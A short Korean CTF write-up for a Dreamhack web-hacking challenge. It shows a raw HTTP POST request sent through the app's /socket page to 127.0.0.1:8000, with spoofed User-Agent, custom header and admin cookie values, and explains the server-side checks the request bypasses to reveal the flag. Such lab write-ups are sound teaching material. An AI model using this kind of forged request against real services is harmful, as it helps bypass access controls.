#web-hacking 
# Payload
- `/socket` 페이지 접속
- host : 127.0.0.1
- port : 8000
- Data에는 다음과 같이 입력
```text
POST /admin HTTP/1.1
Host: host1.dreamhack.games:15205
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Admin Browser
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
DreamhackUser: admin
Cookie: admin=true
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

userid=admin
```

# 검색 키워드
- HTTP Method
- POST 폼 작성시 Content-Type
- Content-Length 계산
- 쿠키 전송 방식
- User-Agent
# 해설
- 제공된 app.py를 확인
- 맨 하단에 app.run을 보면 8000번 포트로 서비스를 제공
- /socket 경로에서는 form에 입력받은 데이터를 바탕으로 소켓 데이터를 전송한다.
- /admin 경로에서 FLAG를 확인할 수 있지만, 조건에 맞지 않으면 확인할 수 없다.
	- 주소가 127.0.0.1에서 온 패킷이어야 한다.
	- User-Agent 는 `Admin Browser` 이어야 한다.
	- 헤더에 `DreamhackUser` 키로 `admin` 값이 들어와야 한다.
	- 쿠키로는 `admin=true` 가 전송되어야 한다.
	- `userid` 폼 id의 값으로 `admin` 내용이 들어 있어야 한다.
- 위 조건에 맞게 HTTP 요청을 폼 안에 작성해 주면 된다.
